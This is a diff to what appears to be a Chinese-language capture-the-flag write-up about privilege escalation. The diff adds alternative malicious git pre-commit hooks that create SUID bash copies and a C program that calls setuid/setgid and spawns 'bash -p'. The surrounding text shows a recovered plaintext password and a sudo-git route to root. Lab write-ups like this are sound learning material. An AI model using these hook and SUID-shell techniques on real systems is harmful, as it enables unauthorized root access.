@@ -137,9 +137,26 @@ mkdir repo
 cd repo
 git init
 echo 'cp /bin/bash /tmp/jenbash; chmod +xs /tmp/jenbash' > ".git/hooks/pre-commit"
+# echo 'echo "/bin/bash" > /var/tmp/jen1bash; chmod +xs /var/tmp/jen1bash' > ".git/hooks/pre-commit"
+# echo 'cd /tmp; gcc shell.c -o shell; chmod +xs shell' > ".git/hooks/pre-commit"
 chmod 777 ".git/hooks/pre-commit"
 7z a rev.zip .git
 cp rev.zip /home/jen/public/repos/
+```
+
+```
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/types.h>
+
+int main() {
+  printf("getuid(): %d\ngeteuid(): %d\ngetgid(): %d\ngetegid(): %d\n", getuid(), geteuid(), getgid(), getegid());
+  setuid(1003);
+  setgid(1003);
+  system("/bin/bash -p");
+  printf("getuid(): %d\ngeteuid(): %d\ngetgid(): %d\ngetegid(): %d\n", getuid(), geteuid(), getgid(), getegid());
+  return 0;
+}
 ```
 
 等待 1 分钟在 tmp 目录下发现 jenbash ：
@@ -172,7 +189,7 @@ rm -f /home/jen/public/repos/*
 |2,1,1590471908,47,"binzpbeocnexoe"
 ```
 
-可能是 jen 或者是 root 用户的密码 sudo -l 输入 binzpbeocnexoe 显示 (ALL) /usr/bin/git ，现在可以直接提权到 root 了：
+可能是 jen 或者是 root 用户的密码，尝试使用 su 切换用户，发现是 jen 的用户密码， sudo -l 输入 binzpbeocnexoe 显示 (ALL) /usr/bin/git ，现在可以直接提权到 root 了：
 
 ```
 sudo -u root git help config
